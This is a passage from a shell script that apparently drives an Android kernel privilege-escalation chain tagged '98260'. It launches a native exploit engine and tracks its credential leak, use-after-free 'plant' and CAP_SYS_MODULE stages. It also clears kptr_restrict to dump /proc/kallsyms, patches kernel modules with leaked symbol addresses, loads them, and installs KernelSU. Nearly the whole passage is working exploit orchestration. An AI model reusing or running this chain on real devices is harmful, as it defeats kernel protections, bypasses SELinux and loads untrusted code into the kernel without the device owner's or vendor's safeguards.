            H1C_TIMER_LINK="${MAGICROOT_98260_TIMER_LINK:-}" \
            H1C_NEG_TIMER="${MAGICROOT_98260_NEG_TIMER:-}" \
            H1C_CRED_LINK="${MAGICROOT_98260_CRED_LINK:-}" \
            H1C_SELINUX_LINK="${MAGICROOT_98260_SELINUX_LINK:-}" \
            H1C_USER_NS="${MAGICROOT_98260_USER_NS:-}" \
            H1C_ROOT_USER="${MAGICROOT_98260_ROOT_USER:-}" \
            H1C_GROUPS="${MAGICROOT_98260_GROUPS:-}" \
            H1C_UCOUNTS="${MAGICROOT_98260_UCOUNTS:-}" \
            H1C_SITE_LOW="${MAGICROOT_98260_SITE_LOW:-}" \
            H1C_KITIMER_SIZE="${MAGICROOT_98260_KITIMER_SIZE:-}" \
            H1C_KITIMER_NODE="${MAGICROOT_98260_KITIMER_NODE:-}" \
            H1C_TASK_CRED="${MAGICROOT_98260_TASK_CRED:-}" \
            H1C_CRED_SIZE="${MAGICROOT_98260_CRED_SIZE:-}" \
            H1C_SLAB_OBJECTS="${MAGICROOT_98260_SLAB_OBJECTS:-}" \
            H1C_SLAB_PAGES="${MAGICROOT_98260_SLAB_PAGES:-}" \
            sh "$D/98260-h1c/run_h1c.sh"
        H1C_RC=$?
        echo "98260_ENGINE_RC=$H1C_RC engine=h1c"
        exit "$H1C_RC"
    fi
    echo "FAIL=98260_h1c_assets_missing dir=$D/98260-h1c template=$KO_TEMPLATE syms=$SYMS"
    echo "98260_CHAIN_END=FAIL code=74"
    exit 74
fi

# ---------------------------------------------------------------------------
# Optional user-supplied kernel module.  SAF has already copied it to a
# device-readable path.  Check ELF / vermagic compatibility, then run the
# selected Flavor's ko_patch before loading the patched output.
# ---------------------------------------------------------------------------
if [ -n "$CUSTOM_KO" ]; then
    CUSTOM_LOG=$D/98260-custom-ko.log
    CUSTOM_PATCHED=$D/98260/custom-patched.ko
    : > "$CUSTOM_LOG" 2>/dev/null || true
    if [ -f "$CUSTOM_KO" ]; then
        MAGIC=$(od -An -tx1 -N4 "$CUSTOM_KO" 2>/dev/null | tr -d ' \n')
        EM=$(od -An -tx1 -j18 -N2 "$CUSTOM_KO" 2>/dev/null | tr -d ' \n')
        VM=$(grep -a -o 'vermagic=[^ ]*' "$CUSTOM_KO" 2>/dev/null | head -1)
        echo "98260_CUSTOM_KO_VERMAGIC=${VM:-unknown} elf=$MAGIC arch=$EM target=$KERNEL" | tee -a "$CUSTOM_LOG"
        if [ "$MAGIC" != "7f454c46" ]; then
            echo "98260_CUSTOM_KO=failed reason=not_elf path=$CUSTOM_KO"
        elif [ -n "$EM" ] && [ "$EM" != "b700" ]; then
            echo "98260_CUSTOM_KO=failed reason=not_aarch64 arch=$EM"
        elif [ -n "$VM" ] && ! printf '%s' "$VM" | grep -q '6\.12'; then
            echo "98260_CUSTOM_KO=failed reason=vermagic_mismatch expected=6.12 actual=$VM"
        elif [ -z "$SLIDE" ] || [ -z "$SYMS" ] || [ ! -f "$SYMS" ] || [ ! -x "$KOPATCH_BIN" ]; then
            echo "98260_CUSTOM_KO=failed reason=patch_inputs_missing slide=$SLIDE syms=$SYMS"
        else
            "$KOPATCH_BIN" "$CUSTOM_KO" "$CUSTOM_PATCHED" "$SYMS" "$SLIDE" "$KERNEL" \
                >> "$CUSTOM_LOG" 2>&1
            PATCH_RC=$?
            PATCH_LINE=$(grep -m1 '^PATCHED=' "$CUSTOM_LOG" 2>/dev/null)
            CUSTOM_MISSING=$(printf '%s\n' "$PATCH_LINE" | sed -n 's/^PATCHED=[0-9]* MISSING=\([0-9][0-9]*\).*/\1/p')
            echo "98260_CUSTOM_KO_PATCH=rc=$PATCH_RC missing=${CUSTOM_MISSING:-none} line=$PATCH_LINE" | tee -a "$CUSTOM_LOG"
            if [ "$PATCH_RC" != "0" ] || [ "${CUSTOM_MISSING:-1}" != "0" ] || [ ! -f "$CUSTOM_PATCHED" ]; then
                echo "98260_CUSTOM_KO=failed reason=ko_patch log=$CUSTOM_LOG"
            elif ! printf '%s\n' "$PATCH_LINE" | grep -Fq "VERMAGIC=$KERNEL SMP"; then
                echo "98260_CUSTOM_KO=failed reason=vermagic_target_mismatch expected=$KERNEL line=$PATCH_LINE"
            else
                echo "98260_CUSTOM_KO_VERMAGIC_MATCH=ok target=$KERNEL" | tee -a "$CUSTOM_LOG"
                if [ "$REAL_CRED_NATIVE" = "1" ]; then
                    real_cred_finit "$CUSTOM_PATCHED" >> "$CUSTOM_LOG" 2>&1
                else
                    printf 'insmod "%s" >/dev/null 2>&1; echo CUSTOM_KO_RC=$?\n' "$CUSTOM_PATCHED" \
                        | "$SU" >> "$CUSTOM_LOG" 2>&1
                fi
                if grep -q -e 'FINIT_RC=0' -e 'CUSTOM_KO_RC=0' "$CUSTOM_LOG" 2>/dev/null; then
                    echo "98260_CUSTOM_KO=loaded path=$CUSTOM_PATCHED source=$CUSTOM_KO"
                else
                    echo "98260_CUSTOM_KO=failed reason=module_load log=$CUSTOM_LOG"
                fi
            fi
        fi
    else
        echo "98260_CUSTOM_KO=missing path=$CUSTOM_KO"
    fi
fi

ksu_loaded_98260() {
    grep -q '^kernelsu ' /proc/modules 2>/dev/null && return 0
    [ -d /sys/module/kernelsu ] && return 0
    if [ -x "$SU" ]; then
        _kl=$("$SU" -c 'grep -q "^kernelsu " /proc/modules && echo load' 2>/dev/null | tr -d '\r\n')
        case "$_kl" in *load*) return 0 ;; esac
    fi
    return 1
}

# Runtime symbol completion for a manager LKM newer than the shipped table.
# The plant is already running when this is called: wait (bounded) for rootd,
# dump /proc/kallsyms with kptr_restrict temporarily cleared, then re-run
# ko_patch with that dump as an optional resolver.  ko_patch accepts exact
# name matches only and refuses zero addresses, so an unavailable symbol still
# fails the chain closed instead of loading a module with a guessed address.
runtime_symbols_retry() {
    _rs_tmpl=$1
    _rs_out=$2
    _rs_syms=$3
    _rs_log=$4
    _rs_dump=$D/98260/kallsyms.runtime
    _rs_script=$D/98260/kallsyms_dump.sh
    # In the real-cred in-process path rootd only starts after finit_module,
    # i.e. after the ready file this retry is trying to publish.  Waiting long
    # for it can never succeed; probe briefly so a genuinely available rootd
    # (reuse / fake-cred) is still used, then fail fast.
    _rs_wait=$(num_or "${MAGICROOT_98260_SYM_WAIT_S:-}" 6)
    mkdir -p "$D/98260" 2>/dev/null || true
    cat > "$_rs_script" <<'EOS'
#!/system/bin/sh
out="$1"
old="$(cat /proc/sys/kernel/kptr_restrict 2>/dev/null)"
[ -n "$old" ] && echo 0 > /proc/sys/kernel/kptr_restrict 2>/dev/null
cat /proc/kallsyms > "$out" 2>/dev/null
rc=$?
chmod 644 "$out" 2>/dev/null
[ -n "$old" ] && echo "$old" > /proc/sys/kernel/kptr_restrict 2>/dev/null
exit $rc
EOS
    chmod 755 "$_rs_script" 2>/dev/null
    rm -f "$_rs_dump" 2>/dev/null
    echo "98260_SYMS_RUNTIME_BEGIN wait=${_rs_wait}s" | tee -a "$KSU_LOG"
    _rs_i=0
    _rs_ok=0
    while [ "$_rs_i" -lt "$_rs_wait" ]; do
        if grep -q 'missed page; holding zombie' "$LOG" 2>/dev/null; then
            echo "98260_SYMS_RUNTIME=aborted reason=plant_parked" | tee -a "$KSU_LOG"
            return 1
        fi
        if [ -n "${EXEC_PID:-}" ] && ! kill -0 "$EXEC_PID" 2>/dev/null; then
            echo "98260_SYMS_RUNTIME=aborted reason=native_exited" | tee -a "$KSU_LOG"
            return 1
        fi
        if [ -n "${SU:-}" ] && [ -x "$SU" ]; then
            timeout 6 "$SU" -c "sh '$_rs_script' '$_rs_dump'" >/dev/null 2>&1
            if [ -s "$_rs_dump" ]; then
                case "$(sed -n '1p' "$_rs_dump" 2>/dev/null)" in
                    0000000000000000*|'0 '*) ;;  # kptr_restrict still hiding
                    *) _rs_ok=1; break ;;
                esac
            fi
        fi
        sleep 2
        _rs_i=$((_rs_i + 2))
    done
    if [ "$_rs_ok" != "1" ]; then
        echo "98260_SYMS_RUNTIME=unavailable reason=no_root_kallsyms waited=${_rs_i}s" | tee -a "$KSU_LOG"
        return 1
    fi
    echo "98260_SYMS_RUNTIME=dump path=$_rs_dump lines=$(wc -l < "$_rs_dump" 2>/dev/null | tr -d ' ')" | tee -a "$KSU_LOG"
    "$KOPATCH_BIN" "$_rs_tmpl" "$_rs_out" "$_rs_syms" "$SLIDE" "$KERNEL" "$_rs_dump" >> "$_rs_log" 2>&1
    PATCH_RC=$?
    PATCH_LINE=$(grep '^PATCHED=' "$_rs_log" 2>/dev/null | tail -1)
    KSU_MISSING=$(printf '%s\n' "$PATCH_LINE" | sed -n 's/^PATCHED=[0-9]* MISSING=\([0-9][0-9]*\).*/\1/p')
    echo "98260_KSU_PATCH_RETRY=$PATCH_RC missing=${KSU_MISSING:-none} resolver=runtime_kallsyms" | tee -a "$KSU_LOG"
    [ "$PATCH_RC" = "0" ] && [ "${KSU_MISSING:-1}" = "0" ]
}

# ---------------------------------------------------------------------------
# KernelSU handoff (DEFAULT ON; opt-out MAGICROOT_98260_KSU=0).
# ksud late-load first, insmod fallback; ksud comes from the selected Flavor.
# ---------------------------------------------------------------------------
if [ "$KSU_ENABLE" = "1" ]; then
    if ksu_loaded_98260; then
        finish_ksu_loaded already-loaded 1
    elif [ "$CRED_MODE" = "fake" ]; then
        # Patch the manager's matching LKM before loading it.  late-load has no
        # external-KO option, so load the init_cred-patched module first and let
        # the manager's late-load detect it and run only userspace stages.
        KSUD=$MAGICROOT_KSUD
        KSU_ALLOW_ARG=""
        [ "$ALLOW_SHELL_98260" = "1" ] && KSU_ALLOW_ARG=" --allow-shell"
        # The rootd command channel can start refusing connect() (EACCES from
        # the vendor LSM) once the KSU module is live.  Pick any su that
        # actually returns uid 0 for the userspace registration step; the
        # module itself is already loaded, so this only needs privilege.
        run_fake_late_load() {
            for _ll_su in "$SU" /system/bin/su su /data/adb/ksu/bin/su; do
                [ -n "$_ll_su" ] || continue
                case "$_ll_su" in
                    /*) [ -x "$_ll_su" ] || continue ;;
                    *) command -v "$_ll_su" >/dev/null 2>&1 || continue ;;
                esac
                _ll_uid=$(timeout 5 "$_ll_su" -c 'id -u' 2>/dev/null | tr -d ' \r\n')
                [ "$_ll_uid" = "0" ] || continue
                echo "98260_FAKE_LATELOAD_SU=$_ll_su" | tee -a "$KSU_LOG"
                printf 'export LD_LIBRARY_PATH="%s"; "%s" late-load --kmi "%s" --package-name "%s"%s\n' \
                    "$D" "$KSUD" "$KMI" "$MGR" "$KSU_ALLOW_ARG" | "$_ll_su" >> "$KSU_LOG" 2>&1
                return $?
            done
            echo "98260_FAKE_LATELOAD_SU=none" | tee -a "$KSU_LOG"
            return 1
        }
        echo "98260_FAKE_LATELOAD_BEGIN kmi=$KMI pkg=$MGR ksud=$KSUD" | tee -a "$KSU_LOG"
        echo "98260_LATE_LOAD_CONFIG=no_preinit=1 no_custom_rc=1 source=late_load_stages" | tee -a "$KSU_LOG"
        if patch_init_cred_module_98260; then
            _init_params=""
            [ "$ALLOW_SHELL_98260" = "1" ] && _init_params="allow_shell=1"
            [ "$SU_COMPAT_98260" = "0" ] && _init_params="force_feature=su_compat:0${_init_params:+ $_init_params}"
            echo "98260_INIT_CRED_INSMOD_BEGIN params=${_init_params:-none}" | tee -a "$KSU_LOG"
            printf 'export LD_LIBRARY_PATH="%s"; "%s" insmod "%s" %s\n' \
                "$D" "$KSUD" "$INIT_CRED_PATCHED" "$_init_params" | "$SU" >> "$KSU_LOG" 2>&1
            echo "98260_INIT_CRED_INSMOD_RC=$?" | tee -a "$KSU_LOG"
            sleep 1
            if ksu_loaded_98260; then
                KSU_METHOD=fake-cred-init-cred-insmod
                echo "98260_INIT_CRED_MODULE_LIVE=1" | tee -a "$KSU_LOG"
                run_fake_late_load
                _fake_ll_rc=$?
                echo "98260_FAKE_LATELOAD_RC=$_fake_ll_rc" | tee -a "$KSU_LOG"
                if [ "$_fake_ll_rc" != "0" ]; then
                    # The module may already be live from insmod; a failed
                    # registration pass is often a transient driver/version
                    # rejection.  Retry once before declaring failure.
                    sleep 2
                    echo "98260_FAKE_LATELOAD_RETRY=1" | tee -a "$KSU_LOG"
                    run_fake_late_load
                    _fake_ll_rc=$?
                    echo "98260_FAKE_LATELOAD_RC2=$_fake_ll_rc" | tee -a "$KSU_LOG"
                fi
                sleep 1
                if ksu_loaded_98260; then
                    # The init_cred-patched module is live, which is what the
                    # manager reads: registration succeeded.  The userspace
                    # late-load stage may still fail because rootd refuses new
                    # connects (EACCES) once the KSU module is live; record
                    # that rc for diagnosis instead of failing the handoff.
                    echo "98260_KSU_USERSLATE_RC=$_fake_ll_rc" | tee -a "$KSU_LOG"
                    if [ "$_fake_ll_rc" != "0" ]; then
                        echo "98260_KSU_USERSLATE_WARN=module_live_userspace_failed" | tee -a "$KSU_LOG"
                    fi
                    finish_ksu_loaded "$KSU_METHOD" 0
                else
                    echo "98260_KSU=failed method=fake-cred-init-cred-userspace rc=$_fake_ll_rc flavor=$KSU_FLAVOR_LOCAL log=$KSU_LOG"
                    # Keep the real userspace error in the exported run log.
                    tail -n 30 "$KSU_LOG" 2>/dev/null | sed 's/^/KSU_LOG_TAIL=/'
                fi
            else
                echo "98260_KSU=failed reason=init_cred_insmod flavor=$KSU_FLAVOR_LOCAL log=$KSU_LOG"
            fi
        else
            _pi_status=$?
            if [ "$_pi_status" = "2" ]; then
                # Compatibility only for profiles whose boot image is not yet
                # available.  This is reported as unpatched, never as a fix.
                KSU_METHOD=fake-cred-manager-late-load
                echo "98260_INIT_CRED_FALLBACK=legacy_embedded reason=unavailable" | tee -a "$KSU_LOG"
                run_fake_late_load
                _fake_ll_rc=$?
                echo "98260_FAKE_LATELOAD_RC=$_fake_ll_rc" | tee -a "$KSU_LOG"
                if [ "$_fake_ll_rc" != "0" ]; then
                    # The module may already be live from insmod; a failed
                    # registration pass is often a transient driver/version
                    # rejection.  Retry once before declaring failure.
                    sleep 2
                    echo "98260_FAKE_LATELOAD_RETRY=1" | tee -a "$KSU_LOG"
                    run_fake_late_load
                    _fake_ll_rc=$?
                    echo "98260_FAKE_LATELOAD_RC2=$_fake_ll_rc" | tee -a "$KSU_LOG"
                fi
                sleep 1
                if ksu_loaded_98260; then
                    # Module live means the manager sees a successful
                    # registration; the userspace late-load rc may be nonzero
                    # when rootd refuses new connects after the module loads.
                    echo "98260_KSU_USERSLATE_RC=$_fake_ll_rc" | tee -a "$KSU_LOG"
                    if [ "$_fake_ll_rc" != "0" ]; then
                        echo "98260_KSU_USERSLATE_WARN=module_live_userspace_failed" | tee -a "$KSU_LOG"
                    fi
                    finish_ksu_loaded "$KSU_METHOD" 0
                else
                    echo "98260_KSU=failed method=fake-cred-init-cred-userspace rc=$_fake_ll_rc flavor=$KSU_FLAVOR_LOCAL log=$KSU_LOG"
                    # Keep the real userspace error in the exported run log.
                    tail -n 30 "$KSU_LOG" 2>/dev/null | sed 's/^/KSU_LOG_TAIL=/'
                fi
            else
                echo "98260_KSU=failed reason=init_cred_patch flavor=$KSU_FLAVOR_LOCAL log=$KSU_LOG"
            fi
        fi
    elif [ -z "$SLIDE" ] || [ -z "$KO_TEMPLATE" ] || [ ! -f "$KO_TEMPLATE" ] || [ -z "$SYMS" ] || [ ! -f "$SYMS" ] || [ ! -x "$KOPATCH_BIN" ]; then
        echo "98260_KSU=skipped reason=patch_inputs_missing flavor=$KSU_FLAVOR_LOCAL profile=$PROFILE_LOCAL"
    else
        PATCHED=$D/98260/ksu-patched.ko
        : > "$KSU_LOG" 2>/dev/null || true
        "$KOPATCH_BIN" "$KO_TEMPLATE" "$PATCHED" "$SYMS" "$SLIDE" "$KERNEL" >> "$KSU_LOG" 2>&1
        PATCH_RC=$?
        PATCH_LINE=$(grep -m1 '^PATCHED=' "$KSU_LOG" 2>/dev/null)
        KSU_MISSING=$(printf '%s\n' "$PATCH_LINE" | sed -n 's/^PATCHED=[0-9]* MISSING=\([0-9][0-9]*\).*/\1/p')
        echo "98260_KSU_PATCH_RC=$PATCH_RC missing=${KSU_MISSING:-none} flavor=$KSU_FLAVOR_LOCAL profile=$PROFILE_LOCAL template=$(basename "$KO_TEMPLATE")" | tee -a "$KSU_LOG"
        # The installer's manager can be newer than the shipped table (for
        # example official KernelSU 32727 added eleven symbol references).
        # The plant is already running, so complete the table from the live
        # kernel instead of failing the whole KSU stage.  Guarded by
        # MISSING_SYM so file/ELF errors still fail immediately.
        if { [ "$PATCH_RC" != "0" ] || [ "${KSU_MISSING:-1}" != "0" ]; } &&
           grep -q '^MISSING_SYM=' "$KSU_LOG" 2>/dev/null; then
            runtime_symbols_retry "$KO_TEMPLATE" "$PATCHED" "$SYMS" "$KSU_LOG" || true
        fi
        # A manager-carved KMI module can be a different KSU build (or a
        # 6.6/6.18 module if KMI probing missed).  Never let it regress the
        # verified chain: if symbol resolution is incomplete, retry once with
        # the bundled per-flavor template.
        if { [ "$PATCH_RC" != "0" ] || [ "${KSU_MISSING:-1}" != "0" ] || [ ! -f "$PATCHED" ]; } &&
           [ "$DUAL_CRED_AVAILABLE" != "1" ] &&
           [ "$(basename "$KO_TEMPLATE")" = "ko-$KSU_FLAVOR_LOCAL.ko" ]; then
            _fb=""
            # Save the failed template's name before ksu_select_ko below
            # overwrites the global $KO_TEMPLATE: without this the
            # "98260_MANAGER_KO_FALLBACK=1 from=... to=..." line always
            # printed the SAME name on both sides (from the fallback
            # template to itself), hiding that the real "from" was the
            # manager-carved module, not a no-op fallback.
            _from_name=$(basename "$KO_TEMPLATE")
            # ksu_select_ko deliberately prefers $D/ko-<flavor>.ko.  Hide the
            # failed manager-carved module first, otherwise the "fallback"
            # re-selects the same file and misses the same symbols again.
            _mgr_override="${MAGICROOT_MANAGER_KO:-$D/ko-$KSU_FLAVOR_LOCAL.ko}"
            _mgr_saved=""
            if [ -f "$_mgr_override" ]; then
                _mgr_saved="$_mgr_override.failed.$$"
                mv -f "$_mgr_override" "$_mgr_saved" 2>/dev/null || _mgr_saved=""
            fi
            if [ -f "$D/kernel_profiles.sh" ]; then
                . "$D/kernel_profiles.sh" 2>/dev/null || true
                ksu_select_ko "$PROFILE_LOCAL" "$KSU_FLAVOR_LOCAL" 2>/dev/null || true
                _fb="$KO_TEMPLATE"
            fi
            [ -n "$_mgr_saved" ] && mv -f "$_mgr_saved" "$_mgr_override" 2>/dev/null || true
            [ -n "$_fb" ] && [ -f "$_fb" ] || _fb="$D/ksu-template.ko"
            if [ -f "$_fb" ]; then
                echo "98260_MANAGER_KO_FALLBACK=1 from=$_from_name to=$(basename "$_fb") reason=missing_symbols_or_patch_rc"
                "$KOPATCH_BIN" "$_fb" "$PATCHED" "$SYMS" "$SLIDE" "$KERNEL" >> "$KSU_LOG" 2>&1
                PATCH_RC=$?
                # Use the LAST PATCHED line: the log was appended by the
                # failed manager-module attempt above.
                PATCH_LINE=$(grep '^PATCHED=' "$KSU_LOG" 2>/dev/null | tail -1)
                KSU_MISSING=$(printf '%s\n' "$PATCH_LINE" | sed -n 's/^PATCHED=[0-9]* MISSING=\([0-9][0-9]*\).*/\1/p')
                KO_TEMPLATE="$_fb"
                echo "98260_KSU_PATCH_RETRY=$PATCH_RC missing=${KSU_MISSING:-none} template=$(basename "$KO_TEMPLATE")" | tee -a "$KSU_LOG"
            fi
        fi
        if [ "$PATCH_RC" != "0" ] || [ "${KSU_MISSING:-1}" != "0" ] || [ ! -f "$PATCHED" ]; then
            echo "98260_KSU=failed reason=ko_patch log=$KSU_LOG"
        elif ! printf '%s\n' "$PATCH_LINE" | grep -Fq "VERMAGIC=$KERNEL SMP"; then
            echo "98260_KSU=failed reason=vermagic_target_mismatch expected=$KERNEL line=$PATCH_LINE"
        else
            if [ "$REAL_CRED_NATIVE" = "1" ]; then
                # late-load never runs preinit/custom-rc.  direct-finit must
                # express the same constraints as module params, but only when
                # this exact manager LKM exports them (unknown params would make
                # finit_module fail with EINVAL on other backends).
                _finit_params=$(cat "$D/98260/finit.params" 2>/dev/null)
                _finit_norc=0
                _finit_preinit=0
                if grep -aq 'parm=norc' "$PATCHED" 2>/dev/null; then
                    _finit_params="${_finit_params:+$_finit_params }norc=1"
                    _finit_norc=1
                fi
                if grep -aq 'parm=preinit' "$PATCHED" 2>/dev/null; then
                    _finit_params="${_finit_params:+$_finit_params }preinit=0"
                    _finit_preinit=1
                fi
                printf '%s' "$_finit_params" > "$D/98260/finit.params" 2>/dev/null || true
                chmod 666 "$D/98260/finit.params" 2>/dev/null || true
                echo "98260_REAL_CRED_MODULE_CONFIG=no_custom_rc=$_finit_norc no_preinit=$_finit_preinit params=${_finit_params:-none}" | tee -a "$KSU_LOG"
                # Publish the ready marker only after ko_patch finished and the
                # vermagic matched; the child must never load a partial file.
                : > "$D/98260/ksu-patched.ready" 2>/dev/null || true
                chmod 666 "$D/98260/ksu-patched.ready" 2>/dev/null || true
                echo "98260_REAL_CRED_KO_READY=$PATCHED" | tee -a "$KSU_LOG"
            fi
            KSUD=""
            if [ -n "${MAGICROOT_KSUD:-}" ] && [ -x "$MAGICROOT_KSUD" ]; then
                KSUD="$MAGICROOT_KSUD"
                echo "98260_KSUD=libexec path=$KSUD"
            elif [ -x "$D/ksud_$KSU_FLAVOR_LOCAL" ]; then
                KSUD="$D/ksud_$KSU_FLAVOR_LOCAL"
                echo "98260_KSUD=selected-manager flavor=$KSU_FLAVOR_LOCAL path=$KSUD"
            elif [ -x "$D/ksud" ]; then
                KSUD=$D/ksud
                echo "98260_KSUD=workdir-fallback path=$KSUD"
            else
                KSUD=/data/adb/ksud
                echo "98260_KSUD=system-fallback path=$KSUD"
            fi
            # Preinstall userspace while rootd is still reachable; KSU LKM
            # load returns SELinux to Enforcing and the rootd client can be denied.
            if [ -n "$KSUD" ] && [ -x "$KSUD" ] && [ -f "$D/libadbroot.so" ]; then
                # Matches the verified g554 test: the manager-embedded libksud
                # needs LD_LIBRARY_PATH=$D for its bundled libadbroot dependency.
                printf 'export LD_LIBRARY_PATH="%s"; "%s" install --libadbroot "%s" --data-path /data/adb\n' \
                    "$D" "$KSUD" "$D/libadbroot.so" | "$SU" >> "$KSU_LOG" 2>&1
                echo "98260_KSU_PREINSTALL_RC=$?" | tee -a "$KSU_LOG"
            fi
            KSU_METHOD=""
            KSU_ALLOW_ARG=""
            [ "$ALLOW_SHELL_98260" = "1" ] && KSU_ALLOW_ARG=" --allow-shell"
            if [ "$REAL_CRED_NATIVE" = "1" ]; then
                # The mintwait child polls for this exact file and loads it
                # in-process with the planted CAP_SYS_MODULE; no socket and no
                # exec-based helper can preserve that capability on this ROM.
                echo "98260_REAL_CRED_INPROC_FINIT_READY path=$PATCHED" | tee -a "$KSU_LOG"
                _fi=0
                while [ "$_fi" -lt "$PROOF_WAIT" ]; do
                    if grep -q '^kernelsu ' /proc/modules 2>/dev/null ||
                       [ -d /sys/module/kernelsu ]; then
                        KSU_METHOD=real-cred-inproc
                        echo "98260_REAL_CRED_INPROC_OK=1 waited=${_fi}s" | tee -a "$KSU_LOG"
                        break
                    fi
                    # Cred capture happens before any UAF.  A failure here can
                    # never be fixed by waiting and leaves no armed victim:
                    # report it at once instead of blocking the UI for
                    # PROOF_WAIT seconds.
                    if grep -q '\[cred\] real cred leak failed' "$LOG" 2>/dev/null; then
                        echo "98260_KSU=failed reason=real_cred_capture waited=${_fi}s" | tee -a "$KSU_LOG"
                        echo "FAIL=98260_real_cred_capture"
                        tail -40 "$LOG" 2>/dev/null || true
                        echo "98260_CHAIN_END=FAIL code=80"
                        exit 80
                    fi
                    if ! kill -0 "$EXEC_PID" 2>/dev/null; then
                        # Unknown early exit: the parent may have armed
                        # victims before dying, so fail closed and require a
                        # reboot unless the log proves a pre-arm failure.
                        echo "98260_KSU=failed reason=native_exited waited=${_fi}s" | tee -a "$KSU_LOG"
                        echo "FAIL=98260_native_exited_before_ksu"
                        parked_mark || true
                        tail -40 "$LOG" 2>/dev/null || true
                        echo "98260_CHAIN_END=FAIL code=80"
                        exit 80
                    fi
                    # The plant parks when every attempt missed; waiting the
                    # full PROOF_WAIT then only delays the failure and keeps
                    # the UI at 98%.
                    if grep -q 'missed page; holding zombie' "$LOG" 2>/dev/null; then
                        echo "98260_KSU=failed reason=root_not_achieved waited=${_fi}s" | tee -a "$KSU_LOG"
                        parked_mark || true
                        tail -40 "$LOG" 2>/dev/null || true
                        echo "98260_CHAIN_END=FAIL code=80"
                        exit 80
                    fi
                    # uid0 can succeed while every cap attempt misses.  Never
                    # leave the UI waiting after the plant has already failed
                    # CAP_SYS_MODULE or finit_module returned an error.
                    if grep -q 'cap_effective plant did not land bit16' "$LOG" 2>/dev/null; then
                        echo "98260_KSU=failed reason=cap_sys_module_not_achieved waited=${_fi}s" | tee -a "$KSU_LOG"
                        echo "FAIL=98260_cap_sys_module_not_achieved"
                        parked_mark || true
                        echo "98260_CHAIN_END=FAIL code=80"
                        exit 80
                    fi
                    if grep -q 'in-process finit_module rc=-' "$LOG" 2>/dev/null; then
                        echo "98260_KSU=failed reason=finit_module_error waited=${_fi}s" | tee -a "$KSU_LOG"
                        echo "FAIL=98260_finit_module_error"
                        parked_mark || true
                        echo "98260_CHAIN_END=FAIL code=80"
                        exit 80
                    fi
                    sleep 1
                    _fi=$((_fi + 1))
                done
                if [ "$KSU_METHOD" != "real-cred-inproc" ]; then
                    echo "98260_KSU=failed reason=real_cred_inproc_timeout waited=${_fi}s" | tee -a "$KSU_LOG"
                    parked_mark || true
                    tail -60 "$LOG" 2>/dev/null || true
                    echo "98260_CHAIN_END=FAIL code=80"
                    exit 80
                fi
                # The module is live and the real-cred takeover already
                # succeeded here.  Confirming su must never gate the run: the
                # manager's userspace init can land minutes later, and a long
                # probe made a successful run look stuck at 64%
                # (2026-11-15 03:57, FinaSU).  One quick pass is informational;
                # if it fails, start the manager in the background and finish.
                _suok=0
                for _sc in su /system/bin/su /data/adb/ksu/bin/su; do
                    case "$_sc" in
                        /*) [ -x "$_sc" ] || continue ;;
                        *) command -v "$_sc" >/dev/null 2>&1 || continue ;;
                    esac
                    _su_id=$(timeout 1 "$_sc" -c 'id -u' 2>/dev/null | tr -d ' \r\n')
                    if [ "$_su_id" = "0" ]; then
                        _suok=1
                        SU=$_sc
                        break
                    fi
                done
                echo "98260_REAL_CRED_SU_PROOF=$([ "$_suok" = "1" ] && echo ok || echo pending) provider=${SU:-none}" | tee -a "$KSU_LOG"
                if [ "$_suok" = "1" ]; then
                    REAL_CRED_SU_PROVEN=1
                    KSU_SU_PROVIDER=$SU
                    register_manager_98260 || true
                else
                    _su_pkg=${MGR:-$(ksu_flavor_pkg "$KSU_FLAVOR_LOCAL" 2>/dev/null || true)}
                    if [ -n "$_su_pkg" ]; then
                        echo "98260_SU_PROOF_REFRESH=async pkg=$_su_pkg" | tee -a "$KSU_LOG"
                        am force-stop "$_su_pkg" >/dev/null 2>&1 || true
                        monkey -p "$_su_pkg" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1 || true
                    fi
                fi
            fi
            # STP compat: load the LKM with force_feature=su_compat:0 so the
            # feature is off before any userspace hook can observe it.  The
            # regular late-load CLI has no force-feature option, so use
            # `ksud insmod <module> <params>` for this path only.
            if [ -z "$KSU_METHOD" ] && [ "$SU_COMPAT_98260" = "0" ] && [ -n "$KSUD" ] && [ -x "$KSUD" ]; then
                _ff_params="force_feature=su_compat:0"
                [ "$ALLOW_SHELL_98260" = "1" ] && _ff_params="$_ff_params allow_shell=1"
                echo "98260_KSU_LOADTIME_SUCOMPAT_OFF=1 params=$_ff_params" | tee -a "$KSU_LOG"
                printf 'export LD_LIBRARY_PATH="%s"; "%s" insmod "%s" %s\n' \
                    "$D" "$KSUD" "$PATCHED" "$_ff_params" | "$SU" >> "$KSU_LOG" 2>&1
                echo "98260_KSU_LOADTIME_INSMOD_RC=$?" | tee -a "$KSU_LOG"
                sleep 1
                if grep -q '^kernelsu ' /proc/modules 2>/dev/null \
                   || [ -d /sys/module/kernelsu ]; then
                    KSU_METHOD=ksud-insmod-sucompat-off
                else
                    echo "98260_KSU_LOADTIME_INSMOD_FAILED=1 fallback=late-load"
                fi
            fi
            _MANAGER_PRIMARY_ALLOWED=1
            # Verified-test primary path: use the manager's own libksud and
            # late-load its matching 6.6 LKM.  Only if this fails do we fall
            # back to patched-KO late-load / insmod.
            # BRM official must late-load the compatibility module copied below,
            # not the manager's generic module with seven unresolved symbols.
            if [ -z "$KSU_METHOD" ] && [ "$_MANAGER_PRIMARY_ALLOWED" = "1" ] &&
               [ "$PROFILE_LOCAL-$KSU_FLAVOR_LOCAL" != "61821brm-kernelsu" ] &&
               [ -n "$KSUD" ] && [ -x "$KSUD" ]; then
                echo "98260_KSU_LATELOAD_PRIMARY_BEGIN kmi=$KMI"
                # Do not let primary late-load replace the patched module with
                # the manager's embedded original.  Load PATCHED first, then
                # let the same late-load perform only userspace stages.
                _primary_params=""
                [ "$ALLOW_SHELL_98260" = "1" ] && _primary_params="allow_shell=1"
                [ "$SU_COMPAT_98260" = "0" ] && _primary_params="force_feature=su_compat:0${_primary_params:+ $_primary_params}"
                printf 'export LD_LIBRARY_PATH="%s"; "%s" insmod "%s" %s\n' \
                    "$D" "$KSUD" "$PATCHED" "$_primary_params" | "$SU" >> "$KSU_LOG" 2>&1
                echo "98260_INIT_CRED_PRIMARY_INSMOD_RC=$?" | tee -a "$KSU_LOG"
                if ksu_loaded_98260; then
                    printf 'export LD_LIBRARY_PATH="%s"; "%s" late-load --kmi "%s" --package-name "%s"%s\n' \
                        "$D" "$KSUD" "$KMI" "$MGR" "$KSU_ALLOW_ARG" | "$SU" >> "$KSU_LOG" 2>&1
                    _primary_ll_rc=$?
                    echo "98260_KSU_LATELOAD_PRIMARY_RC=$_primary_ll_rc" | tee -a "$KSU_LOG"
